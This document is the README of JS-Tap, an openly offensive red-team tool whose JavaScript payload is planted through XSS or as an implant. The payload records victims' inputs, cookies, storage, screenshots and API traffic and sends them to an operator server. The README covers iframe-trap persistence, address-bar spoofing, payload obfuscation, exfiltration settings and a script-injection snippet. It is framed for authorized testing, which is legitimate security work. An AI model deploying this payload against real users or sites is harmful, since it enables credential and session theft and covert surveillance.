# JS-Tap
### v1.05
## This tool is intended to be used on systems you are authorized to attack. Do not use this tool for illegal purposes, or I will be very angry in your general direction.


## Demo
You can read the original blog post about JS-Tap here:<br>
<https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams>

Best recorded demo so far, from ShmooCon:<br>
<https://youtu.be/IDLMMiqV6ss?si=XunvnVarqSIjx_x0&t=19814>

A demo can also be seen in this webinar:<br>
<https://youtu.be/-c3b5debhME?si=CtJRqpklov2xv7Um>


## Upgrade warning
I do not plan on creating migration scripts for the database, and version number bumps often involve database schema changes. You should probably delete your jsTap.db database on version bumps. If you have custom payloads in your JS-Tap server, make sure you export them before the upgrade. 


## Introduction
JS-Tap is a generic JavaScript payload and supporting software to help red teamers attack webapps. The JS-Tap payload can be used as an XSS payload or as a post exploitation implant. 

The payload does not require the targeted user running the payload to be authenticated to the application being attacked, and it does not require any prior knowledge of the application beyond finding a way to get the JavaScript into the application. 

Instead of attacking the application server itself, JS-Tap focuses on the client-side of the application and heavily instruments the client-side code. 

The JS-Tap payload is contained in the **telemlib.js** file. This file has _not_ been obfuscated. Prior to using in an engagement strongly consider changing the naming of endpoints, stripping comments, and highly obfuscating the payload. 

Make sure you review the configuration section below carefully before using on a publicly exposed server. If you don't change the secret key you're going to have a bad time. 

## Data Collected
* Client IP address, OS, Browser
* User inputs (credentials, etc.)
* URLs visited
* Cookies (that don't have **httponly** flag set)
* Local Storage
* Session Storage
* HTML code of pages visited (if feature enabled)
* Screenshots of pages visited
* Copy of XHR API calls (if monkeypatch feature enabled)
	- Endpoint
	- Method (GET, POST, etc.)
	- Headers set
	- Request body and response body
* Copy of Fetch API calls (if monkeypatch feature enabled)
	- Endpoint
	- Method (GET, POST, etc.)
	- Headers set
	- Request body and response body

Note: ability to receive copies of XHR and Fetch API calls works in trap mode. In implant mode only Fetch API can be copied currently. 

## Operating Modes
The payload has two modes of operation. Whether the mode is **trap** or **implant** is set in the **initGlobals()** function, search for the **window.taperMode** variable.
#### Trap Mode
Trap mode is typically the mode you would use as a XSS payload. Execution of XSS payloads is often fleeting, the user viewing the page where the malicious JavaScript payload runs may close the browser tab (the page isn't interesting) or navigate elsewhere in the application. In both cases, the payload will be deleted from memory and stop working. JS-Tap needs to run a long time or you won't collect useful data. 

Trap mode combats this by establishing persistence using an [iFrame trap technique](https://trustedsec.com/blog/persisting-xss-with-iframe-traps). The JS-Tap payload will create a full page iFrame, and start the user elsewhere in the application. This starting page must be configured ahead of time. In the **initGlobals()** function search for the **window.taperstartingPage** variable and set it to an appropriate starting location in the target application. 

In trap mode JS-Tap monitors the location of the user in the iframe trap and it spoofs the address bar of the browser to match the location of the iframe. 

Note that the application targeted must allow iFraming from same-origin or self if it's setting CSP or X-Frame-Options headers. JavaScript based framebusters can also prevent iFrame traps from working. 

Also Note, I've had good luck using Trap Mode for an implant in very specific locations of an application. 

#### Implant Mode
Implant mode would typically be used if you're directly adding the payload into the targeted application. Perhaps you have a shell on the server that hosts the JavaScript files for the application. Add the payload to a JavaScript file that's used throughout the application (jQuery, main.js, etc.). Which file would be ideal really depends on the app in question and how it's using JavaScript files. Implant mode does not require a starting page to be configured, and does not use the iFrame trap technique. 


## Installation and Start
Requires python3. A large number of dependencies are required for the jsTapServer, you are **highly** encouraged to use python virtual environments to isolate the libraries for the server software (or whatever your preferred isolation method is). 

Example:
```
mkdir jsTapEnvironment
python3 -m venv jsTapEnvironment
source jsTapEnvironment/bin/activate
cd jsTapEnvironment
git clone https://github.com/hoodoer/JS-Tap
cd JS-Tap
pip3 install -r requirements.txt

run:
python3 jsTapServer.py
```
If an existing database is found by jsTapServer on startup it will ask you if you want to regenerate a new admin password, and if existing clients are found in the database it will ask if you wish to delete them or not. 



Note that on Mac I also had to install libmagic outside of python.
```
brew install libmagic
```
Playing with JS-Tap locally is fine, but to use in a proper engagment you'll need to be running JS-Tap on publicly accessible VPS and configure Flask with a valid certificate. 


## Configuration (VERY VERY IMPORTANT!)
### jsTapServer.py Configuration
#### Secret Key <------ (deprecated)
**Note: Latest version of JS-Tap randomly generates this secret key each start. If you're running an old copy make sure you're not using a static key.** The old notes are below:

The most important change to make is in the **SECRET_KEY** used by the jsTapServer. This is the secret used to sign authentication cookies. Even if you regenerate a new admin user and password on startup, if you don't change the secret key someone could generate a valid cookie and access your server. 

Change this value from it's default. I left it static because it has made development significantly easier. 
Search for this line:
```
app.config['SECRET_KEY'] = 'YOUR_NEW_SECRET_KEY'
```
Or just switch to the commented out line below it that dynamically generates a new key on startup. 

#### Proxy Mode
For production use JS-Tap should be hosted on a publicly available server with a proper SSL certificate from someone like letsencrypt. The easiest way to deploy this is to allow nginx to act as a front-end to JS-Tap and handle the letsencrypt cert, and then forward the decrypted traffic to JS-Tap as HTTP traffic locally (i.e. nginx and JS-Tap run on the same VPS). 

If you set **proxyMode** to true, JS-Tap server will run in HTTP mode, and take the client IP address from the **X-Forwarded-For** header, which nginx needs to be configured to set. 

When **proxyMode** is set to false, JS-Tap will run with a self-signed certificate, which is useful for testing. The client IP will be taken from the source IP of the client. 


#### Data Directory
The **dataDirectory** parameter tells JS-Tap where the directory is to use for the SQLite database and loot directory. Not all "loot" is stored in the database, screenshots and scraped HTML files in particular are not. 

#### Server Port
To change the server port configuration see the last line of **jsTapServer.py**

```
app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
```

### telemlib.js Configuration
These configuration variables are in the **initGlobals()** function. 

#### JS-Tap Server Location
You need to configure the payload with the URL of the JS-Tap server it will connect back to. 
```
window.taperexfilServer = "https://127.0.0.1:8444";
```

#### Mode
Set to either **trap** or **implant**
This is set with the variable:
```
window.taperMode = "trap";
or
window.taperMode = "implant";
```

#### Trap Mode Starting Page
Only needed for trap mode. See explanation in **Operating Modes** section above.<br>
Sets the page the user starts on when the iFrame trap is set.  
```
window.taperstartingPage = "http://targetapp.com/somestartpage";
```
#### Client Tag
Useful if you're using JS-Tap against multiple applications or deployments at once and want a visual indicator of what payload was loaded. This tag string (keep it short!) is prepended to the client nickname in the JS-Tap portal. Setup multiple payloads, each with the appropriate configuration for the application its being used against, and add a tag indicating which app the client is running. 
```
window.taperTag = 'whatever';
```
#### Custom Payload Tasks
Used to set if clients are checking for **Custom Payload** tasks, and how often they're checking. 
```
window.taperTaskCheck      = true;
window.taperTaskCheckDelay = 5000;
```

#### Exfiltrate HTML
true/false setting on whether a copy of the HTML code of each page viewed is exfiltrated. This is the largest sized item stored in the database (screenshots are not stored in the database). 

```
window.taperexfilHTML = true;
```

#### MonkeyPatch APIs
Enable monkeypatching of XHR and Fetch APIs. This works in trap mode. In implant mode, only Fetch APIs are monkeypatched. Monkeypatching allows JavaScript to be rewritten at runtime. Enabling this feature will re-write the XHR and Fetch networking APIs used by JavaScript code in order to tap the contents of those network calls. Not that jQuery based network calls will be captured in the XHR API, which jQuery uses under the hood for network calls. 

```
window.monkeyPatchAPIs = true;
```

#### Screenshot after API calls
By default JS-Tap will capture a new screenshot after the user navigates to a new page. Some applications do not change their path when new data is loaded, which would cause missed screenshots. JS-Tap can be configured to capture a new screenshot after an XHR or Fetch API call is made. These API calls are often used to retrieve new data to display. Two settings are offered, one to enable the "after API call screenshot", and a delay in milliseconds. X milliseconds after the API call JS-Tap will capture the new screenshot. 

```
window.postApiCallScreenshot = true;
window.screenshotDelay       = 1000;
```

## JS-Tap Portal
Login with the admin credentials provided by the server script on startup. 

Clients show up on the left, selecting one will show a time series of their events (loot) on the right. 

The clients list can be sorted by time (first seen, last update received) and the list can be filtered to only show the "starred" clients. There is also a quick filter search above the clients list that allows you to quickly filter clients that have the entered string. Useful if you set an optional tag in the payload configuration. Optional tags show up prepended to the client nickname. 

Each client has an 'x' button (near the star button). This allows you to delete the session for that client, if they're sending junk or useless data, you can prevent that client from submitting future data. 

When the JS-Tap payload starts, it retrieves a session from the JS-Tap server. If you want to stop all new client sessions from being issues, select **Session Settings** at the top and you can disable new client sessions. You can also block specific IP addresses from receiving a session in here. 

Each client has a "notes" feature. If you find juicy information for that particular client (credentials, API tokens, etc) you can add it to the client notes. After you've reviewed all your clients and made you notes, the **View All Notes** feature at the top allows you to export all notes from all clients at once. 

The events list can be filtered by event type if you're trying to focus on something specific, like screenshots. Note that the events/loot list does _not_ automatically update (the clients list does). If you want to load the latest events for the client you need to select the client again on the left. 

#### Custom Payloads
Starting in version 1.02 there is a custom payload feature. Multiple JavaScript payloads can be added in the JS-Tap portal and executed on a single client, all current clients, or set to autorun on all future clients. Payloads can be written/edited within the JS-Tap portal, or imported from a file. Payloads can also be exported. The format for importing payloads is simple JSON. The JavaScript code and description are simply base64 encoded. 
```
[{"code":"YWxlcnQoJ1BheWxvYWQgMSBmaXJpbmcnKTs=","description":"VGhlIGZpcnN0IHBheWxvYWQ=","name":"Payload 1"},{"code":"YWxlcnQoJ1BheWxvYWQgMiBmaXJpbmcnKTs=","description":"VGhlIHNlY29uZCBwYXlsb2Fk","name":"Payload 2"}]
```
The main user interface for custom payloads is from the top menu bar. Select **Custom Payloads** to open the interface. Any existing payloads will be shown in a list. The bottom button bar allows you to import and export the list. A **Show Editor** button allows you to create and edit payloads. To load an existing payload for editing, open the editor and select the payload by clicking on it in the **Saved Payloads** list. Once you have payloads defined and saved, you can execute them on clients. <br>

In the main **Custom Payloads** view you can launch a payload against all current clients (the **Run Payload** button). You can also toggle on the **Autorun** attribute of a payload, which means that all new clients will run the payload. Note that existing clients will not run a payload based on the Autorun setting. <br>

You can toggle on **Repeat Payload** and the payload will be tasked for each client when they send an update to the JS-Tap server. Remember, the rate that a client checks for custom payload tasks is variable, and that rate can be changed in the main JS-Tap payload configuration. That rate can be changed with a custom payload. <br>

To run a payload on a single client user the **Run Payload** button on the specific client you wish to run it on, and then hit the run button for the specific payload you wish to use. 


## Tools
A few tools are included in the tools subdirectory. 

### clientSimulator.py
A script to stress test the jsTapServer. Good for determining roughly how many clients your server can handle. Note that running the clientSimulator script is probably more resource intensive than the actual jsTapServer, so you may wish to run it on a separate machine. 

At the top of the script is a **numClients** variable, set to how many clients you want to simulator. The script will spawn a thread for each, retrieve a client session, and send data in simulating a client. 

```
numClients = 50
```
Hopefully a future blog will show how to configure JS-Tap to use a proper database instead of sqlite (it's using sqlalchemy, so not a hard switch) and a better server configuration to scale better. 

You'll also need to configure where you're running the jsTapServer for the clientSimulator to connect to:
```
apiServer = "https://127.0.0.1:8444"
```

### MonkeyPatchApp
A simple app used for testing XHR/Fetch monkeypatching, but can give you a simple app to test the payload against in general. 

Run with:
```
python3 monkeyPatchLab.py
```

By default this will start the application running on:
```
https://127.0.0.1:8443
```

Pressing the "Inject JS-Tap payload" button will run the JS-Tap payload. This works for either implant or trap mode. You may need to point the monkeyPatchLab application at a new JS-Tap server location for loading the payload file, you can find this set in the **injectPayload()** function in **main.js**

```
function injectPayload()
{
	document.head.appendChild(Object.assign(document.createElement('script'),
		{src:'https://127.0.0.1:8444/lib/telemlib.js',type:'text/javascript'}));
}
```

### formParser.py
Abandoned tool, is a good start on analyzing HTML for forms and parsing out their parameters. Intended to help automatically generate JavaScript payloads to target form posts. 

You should be able to run it on exfiltrated HTML files. Again, this is currently abandonware. 


### generateIntelReport.py
Not even sure if this works anymore. Prior to the web UI for JS-Tap, the generateIntelReport script would comb through the gathered loot and generate a PDF report. 




## Contact
@hoodoer<br>
hoodoer@bitwisemunitions.dev





